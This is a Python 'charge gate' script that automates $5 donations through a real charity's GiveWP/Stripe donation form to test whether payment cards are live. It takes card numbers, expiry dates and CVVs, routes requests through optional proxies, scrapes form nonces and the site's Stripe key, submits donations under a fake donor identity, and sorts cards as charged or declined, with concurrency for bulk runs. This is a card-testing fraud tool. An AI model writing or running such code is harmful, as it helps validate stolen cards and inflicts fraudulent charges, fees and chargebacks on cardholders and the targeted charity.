"""
Stripe Charge Gate - BrighterCommunities Give Donation Form
Uses WordPress Give + Stripe. Flow: donate page -> load gateway -> payment_method -> submit donation.
Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
"""

import json
import re
import uuid
import asyncio
import logging
from typing import Optional
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor

import httpx

logger = logging.getLogger(__name__)

# Gate config
DONATE_URL = "https://www.brightercommunities.org/donate-form/"
AJAX_URL = "https://www.brightercommunities.org/wp-admin/admin-ajax.php"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
TIMEOUT = 30
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"

# Stripe keys from brightercommunities (embedded in page)
STRIPE_KEY = "pk_live_51Jzi6nQVHkKo6W5B7vi4ylBIE8w8OHJONrCOUQge1nPxjiIvbtlq1ivOEy6tltBXAZhZvAmYsrUe9Rm9tgzvZlw0008LIpS3ft"
STRIPE_ACCOUNT = "acct_1Jzi6nQVHkKo6W5B"

# Stripe decline patterns (professional mapping)
DECLINE_PATTERNS = [
    r"card\s+was\s+declined",
    r"card\s+declined",
    r"declined",
    r"do\s+not\s+honor",
    r"insufficient\s+funds",
    r"incorrect\s+number",
    r"invalid\s+card",
    r"expired\s+card",
    r"lost\s+card",
    r"stolen\s+card",
    r"pickup\s+card",
    r"restricted\s+card",
    r"fraudulent",
    r"security\s+code\s+.*\s+incorrect",
    r"cvc\s+.*\s+invalid",
    r"incorrect\s+cvc",
    r"incorrect\s+zip",
    r"incorrect\s+address",
    r"transaction\s+not\s+allowed",
    r"generic\s+decline",
    r"issuer\s+declined",
    r"there was an issue with your donation",
    r"couldn't confirm your payment",
    r"check your card details",
    r"tokenization\s+(?:error|failed)",
    r"payment\s+method\s+(?:invalid|failed)",
    r"stripe\s+(?:error|failed)",
]

SUCCESS_PATTERNS = [
    r"thank\s+you",
    r"donation\s+received",
    r"payment\s+successful",
    r"order\s+confirmation",
    r"receipt",
    r"confirmation",
]

_executor = ThreadPoolExecutor(max_workers=8)


def _normalize_year(ano: str) -> str:
    yy = str(ano).strip()
    if len(yy) == 4 and yy.startswith("20"):
        return yy[2:]
    return yy


def _normalize_month(mes: str) -> str:
    m = str(mes).strip()
    return m.zfill(2) if len(m) == 1 else m


def _parse_donate_page(html: str) -> dict:
    """Extract form nonce, form ID, and other needed values from donate page."""
    out = {
        "give_form_hash": None,
        "give_form_id": "1938",
        "give_form_id_prefix": "1938-1",
        "give_form_minimum": "5.00",
        "give_form_maximum": "999999.99",
    }
    # give-form-hash / give_form_hash
    m = re.search(r'give-form-hash["\']?\s*[=:]\s*["\']?([a-f0-9]+)', html, re.I)
    if m:
        out["give_form_hash"] = m.group(1)
    m = re.search(r'give_form_hash["\']?\s*[=:]\s*["\']?([a-f0-9]+)', html, re.I)
    if m:
        out["give_form_hash"] = m.group(1)
    m = re.search(r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
    if m:
        out["give_form_hash"] = m.group(1)
    m = re.search(r'value=["\']([a-f0-9]{8,12})["\'][^>]*name=["\']give-form-hash["\']', html, re.I)
    if m:
        out["give_form_hash"] = m.group(1)
    # form id
    m = re.search(r'give-form-id["\']?\s*[=:]\s*["\']?(\d+)', html, re.I)
    if m:
        out["give_form_id"] = m.group(1)
        out["give_form_id_prefix"] = f"{m.group(1)}-1"
    if not out["give_form_hash"]:
        out["give_form_hash"] = "8cc5730a84"  # fallback from user capture
    return out


def _parse_stripe_key(html: str) -> tuple:
    """Extract Stripe publishable key and account from page."""
    key = STRIPE_KEY
    acc = STRIPE_ACCOUNT
    m = re.search(r'pk_live_[a-zA-Z0-9]+', html)
    if m:
        key = m.group(0)
    m = re.search(r'acct_[a-zA-Z0-9]+', html)
    if m:
        acc = m.group(0)
    return key, acc


def _parse_json_response(text: str) -> Optional[tuple]:
    """
    Parse GiveWP AJAX JSON response.
    Returns (status, response_msg) or None if not JSON.
    """
    text = (text or "").strip()
    if not text or not (text.startswith("{") or text.startswith("[")):
        return None
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return None
    if not isinstance(data, dict):
        return None
    success = data.get("success") is True
    inner = data.get("data") or {}
    if isinstance(inner, dict):
        err = inner.get("error") or inner.get("message") or inner.get("msg") or ""
        redirect = inner.get("redirect") or ""
    else:
        err = str(inner) if inner else ""
        redirect = ""
    err_lower = (err or "").lower()
    redirect_lower = (redirect or "").lower()
    if success:
        if "thank" in redirect_lower or "confirmation" in redirect_lower or "receipt" in redirect_lower:
            return "charged", "DONATION_SUCCESSFUL"
        if redirect:
            return "charged", "DONATION_SUCCESSFUL"
        return "charged", "DONATION_SUCCESSFUL"
    if err:
        for pat in DECLINE_PATTERNS:
            if re.search(pat, err_lower):
                msg = err.upper().replace(" ", "_")[:60]
                return "declined", msg
        return "declined", err.upper().replace(" ", "_")[:60]
    # success=False but no error message - try top-level
    top_err = data.get("error") or data.get("message") or ""
    if top_err:
        return "declined", str(top_err).upper().replace(" ", "_")[:60]
    return None


def _parse_final_response(html: str) -> tuple:
    """
    Parse final donation form response (HTML or JSON).
    Returns (status, response_msg) where status is charged|approved|declined|error
    """
    # 1. Try JSON first (GiveWP AJAX)
    json_result = _parse_json_response(html)
    if json_result:
        return json_result

    html_lower = (html or "").lower()
    # 2. Check for success in HTML
    for pat in SUCCESS_PATTERNS:
        if re.search(pat, html_lower):
            return "charged", "DONATION_SUCCESSFUL"
    # 3. Check for decline
    for pat in DECLINE_PATTERNS:
        m = re.search(pat, html_lower, re.I)
        if m:
            err_div = re.search(
                r'give_error[^>]*>.*?<p[^>]*>.*?([^<]+(?:declined|error|issue)[^<]*)',
                html,
                re.I | re.DOTALL,
            )
            if err_div:
                msg = re.sub(r"\s+", " ", err_div.group(1)).strip()[:80]
                return "declined", msg.upper().replace(" ", "_")
            return "declined", "CARD_DECLINED"
    # 4. Try to extract error from give_error div
    err = re.search(
        r'<div[^>]*class="[^"]*give_error[^"]*"[^>]*>.*?<p[^>]*>\s*<strong>[^<]*</strong>\s*([^<]+)',
        html,
        re.I | re.DOTALL,
    )
    if err:
        msg = re.sub(r"\s+", " ", err.group(1)).strip()[:80]
        return "declined", msg.upper().replace(" ", "_")
    # 5. Try Stripe error in JSON-like fragments
    stripe_err = re.search(r'"message"\s*:\s*"([^"]+)"', html, re.I)
    if stripe_err:
        msg = stripe_err.group(1).upper().replace(" ", "_")[:60]
        if any(x in msg.lower() for x in ("declined", "invalid", "incorrect", "expired")):
            return "declined", msg
        return "error", msg
    # 6. Generic - try to extract any error-like text
    err_snippet = re.search(r'(?:error|declined|failed)[:\s]+["\']?([^"\'<>\n]{10,80})', html_lower)
    if err_snippet:
        return "error", err_snippet.group(1).upper().replace(" ", "_")[:50]
    # 7. Empty/short response
    if not html or len(html.strip()) < 20:
        return "error", "EMPTY_RESPONSE"
    # 8. Try to extract JSON error/message for debugging
    for key in ("error", "message", "msg", "data"):
        m = re.search(rf'"{key}"\s*:\s*"([^"]{{10,80}})"', html, re.I)
        if m:
            return "error", m.group(1).upper().replace(" ", "_")[:55]
    logger.debug("UNKNOWN_RESPONSE - raw snippet: %s", (html or "")[:500])
    return "error", "UNKNOWN_RESPONSE"


def _check_stripe_charge_sync(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
    """Synchronous Stripe Charge check via brightercommunities Give form."""
    try:
        mm = _normalize_month(mes)
        yy = _normalize_year(ano)
        proxies = {"http://": proxy, "https://": proxy} if proxy else None

        with httpx.Client(
            timeout=TIMEOUT,
            follow_redirects=True,
            proxies=proxies,
            headers={"User-Agent": USER_AGENT},
        ) as client:
            # 1. GET donate page
            r = client.get(DONATE_URL)
            if r.status_code != 200:
                return {"status": "error", "response": "DONATE_PAGE_FAILED"}
            html = r.text
            form_data = _parse_donate_page(html)
            stripe_key, stripe_acc = _parse_stripe_key(html)
            nonce = form_data["give_form_hash"]
            form_id = form_data["give_form_id"]
            form_prefix = form_data["give_form_id_prefix"]

            # 2. Reset nonce (optional, may help with session)
            try:
                client.post(
                    AJAX_URL,
                    data={
                        "action": "give_donation_form_reset_all_nonce",
                        "give_form_id": form_id,
                    },
                    headers={
                        "User-Agent": USER_AGENT,
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Origin": "https://www.brightercommunities.org",
                        "Referer": DONATE_URL,
                        "X-Requested-With": "XMLHttpRequest",
                    },
                )
            except Exception:
                pass

            # 3. Load Stripe gateway
            try:
                client.post(
                    AJAX_URL,
                    params={"payment-mode": "stripe"},
                    data={
                        "action": "give_load_gateway",
                        "give_total": "5.00",
                        "give_form_id": form_id,
                        "give_form_id_prefix": form_prefix,
                        "give_payment_mode": "stripe",
                        "nonce": nonce,
                    },
                    headers={
                        "User-Agent": USER_AGENT,
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Origin": "https://www.brightercommunities.org",
                        "Referer": DONATE_URL,
                        "X-Requested-With": "XMLHttpRequest",
                    },
                )
            except Exception:
                pass

            # 4. Create Stripe payment method
            guid = str(uuid.uuid4()).replace("-", "")[:32]
            muid = "2f4fa95b-8783-4e50-adaf-bfac7525094c03379e"
            sid = "522d811a-0e4b-4b6a-ba73-1b84eff2422ae4d432"
            pm_data = {
                "type": "card",
                "billing_details[name]": "Mass TH",
                "billing_details[email]": "mass652004@gmail.com",
                "card[number]": card,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "payment_user_agent": "stripe.js/1239285b29; stripe-js-v3/1239285b29; split-card-element",
                "referrer": "https://www.brightercommunities.org",
                "key": stripe_key,
                "_stripe_account": stripe_acc,
            }
            pm_resp = client.post(
                STRIPE_PM_URL,
                data=pm_data,
                headers={
                    "User-Agent": USER_AGENT,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                },
            )

            # Parse payment method response (Stripe returns JSON)
            try:
                pm_json = pm_resp.json()
            except Exception:
                return {"status": "error", "response": "INVALID_STRIPE_RESPONSE"}

            if "error" in pm_json:
                err = pm_json["error"]
                msg = err.get("message", "CARD_DECLINED")
                return {"status": "declined", "response": msg.upper().replace(" ", "_")[:60]}

            pm_id = pm_json.get("id")
            if not pm_id or not pm_id.startswith("pm_"):
                return {"status": "error", "response": "NO_PAYMENT_METHOD_ID"}

            # 5. Submit donation form - try admin-ajax (GiveWP AJAX) first, then donate page
            donate_data = {
                "give-honeypot": "",
                "give-form-id-prefix": form_prefix,
                "give-form-id": form_id,
                "give-form-title": "Donation Form",
                "give-current-url": DONATE_URL,
                "give-form-url": DONATE_URL,
                "give-form-minimum": form_data.get("give_form_minimum", "5.00"),
                "give-form-maximum": form_data.get("give_form_maximum", "999999.99"),
                "give-form-hash": nonce,
                "give-price-id": "custom",
                "give-recurring-logged-in-only": "",
                "give-logged-in-only": "1",
                "_give_is_donation_recurring": "0",
                "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                "give-amount": "5.00",
                "give_stripe_payment_method": pm_id,
                "payment-mode": "stripe",
                "give_first": "Mass",
                "give_last": "TH",
                "give_email": "mass652004@gmail.com",
                "card_name": "MAXINE HARRY",
                "give_action": "purchase",
                "give-gateway": "stripe",
                "action": "give_process_donation",
                "give_ajax": "true",
            }

            ajax_headers = {
                "User-Agent": USER_AGENT,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://www.brightercommunities.org",
                "Referer": DONATE_URL,
                "X-Requested-With": "XMLHttpRequest",
            }

            # 5a. Try admin-ajax.php (GiveWP AJAX - returns JSON)
            try:
                ajax_resp = client.post(
                    AJAX_URL,
                    data=donate_data,
                    headers=ajax_headers,
                )
                if ajax_resp.status_code == 200 and ajax_resp.text.strip():
                    status, msg = _parse_final_response(ajax_resp.text)
                    if status != "error" or msg != "UNKNOWN_RESPONSE":
                        return {"status": status, "response": msg}
            except Exception:
                pass

            # 5b. Fallback: POST to donate page (may redirect to thank-you)
            donate_data.pop("action", None)
            donate_data.pop("give_ajax", None)
            final_resp = client.post(
                DONATE_URL,
                params={"payment-mode": "stripe", "form-id": form_id},
                data=donate_data,
                headers={
                    "User-Agent": USER_AGENT,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://www.brightercommunities.org",
                    "Referer": DONATE_URL,
                },
            )

            status, msg = _parse_final_response(final_resp.text)
            return {"status": status, "response": msg}

    except httpx.TimeoutException:
        return {"status": "error", "response": "TIMEOUT"}
    except Exception as e:
        return {"status": "error", "response": str(e).upper().replace(" ", "_")[:50]}


async def async_stripe_charge_gate(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
    """Async wrapper for Stripe Charge gate (brightercommunities)."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        _executor,
        _check_stripe_charge_sync,
        card, mes, ano, cvv, proxy,
    )
